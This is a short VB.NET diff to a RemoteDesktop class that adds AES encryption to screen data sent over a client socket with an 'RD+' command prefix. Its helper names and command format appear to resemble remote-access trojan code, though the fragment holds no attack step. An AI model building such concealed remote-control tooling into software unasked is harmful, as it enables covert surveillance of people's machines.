@@ -35,7 +35,7 @@ Public Class RemoteDesktop
             Try
                 SyncLock ClientSocket.S
                     Using MEM As New IO.MemoryStream
-                        Dim Bb As Byte() = SB(("RD+" + ClientSocket.SPL + BS(MS.ToArray)))
+                        Dim Bb As Byte() = AES_Encryptor(SB(("RD+" + ClientSocket.SPL + BS(MS.ToArray))))
                         Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
 
                         MEM.Write(L, 0, L.Length)
